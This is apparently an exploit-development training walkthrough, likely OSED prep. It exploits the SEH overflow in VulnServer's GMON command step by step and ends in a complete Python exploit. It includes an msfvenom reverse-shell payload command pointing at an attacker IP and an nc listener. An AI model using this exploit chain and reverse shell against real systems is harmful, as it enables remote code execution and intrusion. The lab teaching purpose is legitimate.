# Full Worked Example — VulnServer GMON (SEH overflow)

Second canonical exploit. Where TRUN was a straight EIP overwrite, **GMON is SEH-based**:
EIP stays intact, but you overwrite the exception handler chain. Do TRUN first, then this.
Assume victim `192.168.1.50:9999`, WinDbg attached, Kali attacker.

---

## Step 0 — recognize it's SEH
GMON takes a large argument. Fuzz it:
```python
import socket
s=socket.socket(); s.connect(("192.168.1.50",9999)); s.recv(1024)
s.send(b"GMON /.:/ " + b"A"*5000); s.close()
```
Crash → `r` shows **EIP is NOT 41414141** (it's some app address). That's the tell.
Now check the handler:
```
!exchain
```
You'll see the SEH handler = **41414141**. You control the SEH chain, not EIP directly.
This is the SEH decision-tree branch → `00-methodology/seh-playbook.md`.

## Step 1 — pass the exception so mona can read the chain
The SEH record only becomes meaningful when the exception is about to be handled. Then:
```
!py mona findmsp
```
It reports: *"SEH record (nseh field) at ... offset 3515"* and the SEH handler at 3519.
So: **nSEH offset = 3515**, **SEH offset = 3519** (SEH is always nSEH+4).
(Manual way: cyclic pattern → read the SEH value → `msf-pattern_offset -q <SEH>`.)

## Step 2 — confirm control of nSEH + SEH
```python
buf  = b"GMON /.:/ "
buf += b"A"*3515
buf += b"BBBB"                 # nSEH  -> should show 42424242
buf += b"CCCC"                 # SEH   -> should show 43434343
buf += b"D"*(5000-len(buf))
```
Crash, pass the exception, `!exchain` → nSEH=42424242, SEH=43434343. You own both.

## Step 3 — find a POP POP RET (SafeSEH-off, non-ASLR)
```
!py mona seh -cpb "\x00"
```
essfunc.dll (no SafeSEH, no ASLR) gives a POP POP RET, e.g. **0x625010B4**. Verify:
```
u 625010b4      ; should be pop <reg> / pop <reg> / ret
```
Little-endian into SEH: `\xb4\x10\x50\x62`.

## Step 4 — nSEH = short jump over the SEH pointer
POP POP RET lands execution back on nSEH (4 bytes), immediately followed by the 4-byte SEH
field. Jump over it into your shellcode:
```
nSEH = b"\xeb\x06\x90\x90"     # EB 06 = short jmp +6, NOP padded
```

## Step 5 — bad chars
Same ritual as TRUN. For GMON, only `\x00` is bad:
```
!py mona bytearray -b "\x00"
; place after SEH, crash, then compare at that memory:
!py mona compare -f c:\mona\vulnserver\bytearray.bin -a <addr>
```

## Step 6 — shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 \
  -f python -v shellcode -b "\x00" EXITFUNC=thread
```

## Step 7 — final exploit
```python
#!/usr/bin/env python3
import socket, struct
ip, port = "192.168.1.50", 9999

nseh = b"\xeb\x06\x90\x90"                 # short jmp +6 over the SEH field
seh  = struct.pack("<I", 0x625010b4)       # essfunc.dll POP POP RET

shellcode  = b""                            # <-- paste msfvenom bytes
shellcode += b""

buf  = b"GMON /.:/ "
buf += b"A"*3515                            # to nSEH
buf += nseh                                 # nSEH
buf += seh                                  # SEH (POP POP RET)
buf += b"\x90"*8                            # small pad before shellcode
buf += shellcode
buf += b"D"*(5000 - len(buf))

s = socket.socket(); s.connect((ip, port)); s.recv(1024)
s.send(buf); s.close()
print("[+] fired")
```

## Step 8 — catch it
```bash
nc -lvnp 443     # BEFORE firing
```

---

## The trap that catches everyone on SEH
- **You must pass the first-chance exception** (`g` in WinDbg) for control to transfer to
  your handler. If you break at the initial access violation and stop, you're looking at
  the wrong moment — the SEH overwrite hasn't been "used" yet.
- **Short-jump math:** `\xeb\x06` skips the 4-byte SEH pointer plus the jump's own tail.
  If your shellcode starts a few bytes off, adjust the jump or add NOP padding.
- **Not enough room after SEH?** Do a two-stage jump (nSEH → short jmp back into a bigger
  earlier buffer), or drop an egghunter at the SEH landing and spray the real shellcode
  into GMON's roomy buffer. See `00-methodology/egghunter-playbook.md`.

## TRUN vs GMON — internalize the difference
| | TRUN | GMON |
|---|---|---|
| EIP after crash | your bytes (41414141) | intact app address |
| what you overwrite | saved return address | nSEH + SEH handler |
| the gadget | JMP ESP | POP POP RET |
| how control transfers | ret pops EIP | exception → handler → ppr → nSEH |
| module requirement | non-ASLR | non-ASLR **and** SafeSEH-off |

When you can do BOTH from memory, you've got the two reflexes ~70% of OSED leans on.
